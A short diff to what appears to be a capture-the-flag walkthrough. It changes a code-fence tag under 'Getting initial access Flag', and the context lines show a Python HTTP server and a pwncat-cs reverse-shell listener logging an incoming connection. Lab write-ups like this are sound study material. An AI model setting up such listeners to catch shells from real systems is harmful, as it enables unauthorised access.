@@ -378,7 +378,7 @@ python3 -m http.server 80
 
 ### Getting initial access Flag
 
-````````bash
+````````python
 pwncat-cs -lp 1234                    
 [00:47:27] Welcome to pwncat 🐈!                                                                                                                             __main__.py:164
 [00:49:34] received connection from 192.168.190.78:38454                                                                                                          bind.py:84
